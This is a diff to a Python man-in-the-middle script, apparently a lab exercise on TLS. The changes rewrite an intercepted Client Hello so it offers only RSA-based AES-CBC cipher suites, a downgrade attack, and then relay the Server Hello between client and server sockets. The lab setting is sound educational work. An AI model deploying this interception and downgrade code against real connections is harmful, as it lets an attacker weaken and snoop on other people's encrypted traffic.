@@ -34,7 +34,7 @@ def print_with_hexdump(binary,send_or_receive):
         print('Send command to client: \n')
     elif send_or_receive == 'receive_alice':
         print('Receive command from client: \n')
-    if send_or_receive == 'send_bob':
+    elif send_or_receive == 'send_bob':
         print('Send command to server: \n')
     elif send_or_receive == 'receive_bob':
         print('Receive command from server: \n')
@@ -49,6 +49,8 @@ class MITM:
     def __init__(self):
         self.allowed_cipher_suits = bytearray.fromhex("00 2f 00 35")
         self.message_type_client_hello = bytearray.fromhex("01")[0]
+        self.message_type_server_hello = bytearray.fromhex("02")[0]
+        self.cipher_suit = None
     
     def receive_alice_request(self, alice_socket):
         data = alice_socket.recv(BUFFER_SIZE)
@@ -62,11 +64,14 @@ class MITM:
     def handle_alice_request(self, request, data):
         if request == 'Client_Hello':
             # 44 - 57
+            print('Received Client Hello.\n')
             print('Switching available cipher suits to include only the ones we can attack:\n')
             print('We can attack the following cipher suits: \n')
             print('00 2f - assigned value for TLS_RSA_WITH_AES_128_CBC_SHA\n')
             print('00 35 - assigned value for TLS_RSA_WITH_AES_256_CBC_SHA\n')
+            print('Removing all other cipher suits!\n')
             data = data[:3] + bytearray.fromhex("00 2c 01 00 00 28") + data[9:44] + self.allowed_cipher_suits + data[58:]
+            print('Sending tempered Client Hello.\n')
         else:
             raise Exception('Request is invalid! fix your code!')
         return data
@@ -75,9 +80,21 @@ class MITM:
     def receive_bob_response(self, bob_socket):
         data = bob_socket.recv(BUFFER_SIZE)
         print_with_hexdump(data,'receive_bob')
+        if data[5] == self.message_type_server_hello:
+            request = 'Server_Hello'
+        else:
+            raise Exception('Request is invalid! fix your code!')
+        return request,data
         
     def handle_bob_response(self, request, data):
-        return
+        if request == 'Server_Hello':
+            print('Received Server Hello.\n')
+            self.cipher_suit = data[-3:-1]
+            data = data
+            print('Forwarding Server Hello.\n')
+        else:
+            raise Exception('Request is invalid! fix your code!')
+        return data
     
     def send_to(self, response, cur_socket,socket_name):
         if socket_name == 'Alice':
@@ -89,7 +106,12 @@ class MITM:
         cur_socket.send(response)
     
     def receive_from_alice_send_to_bob_and_receive_send_back_to_alice(self,alice_socket, bob_socket):
-        
+        request, data = self.receive_alice_request(alice_socket)
+        response = self.handle_alice_request(request, data)
+        self.send_to(response, bob_socket, 'Bob')
+        request, data = self.receive_bob_response(bob_socket)
+        response = self.handle_bob_response(request, data)
+        self.send_to(response, alice_socket, 'Alice')
     
 def main():
     # open socket with client
@@ -105,6 +127,7 @@ def main():
     bob_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     print('Connecting to Bob\n')
     bob_socket.connect((IP2, PORT2))
+    ManInTheMiddle.receive_from_alice_send_to_bob_and_receive_send_back_to_alice(alice_socket,bob_socket)
     print('Closing connection with Bob\n')
     bob_socket.close()
     print('Disconnecting Alice\n')
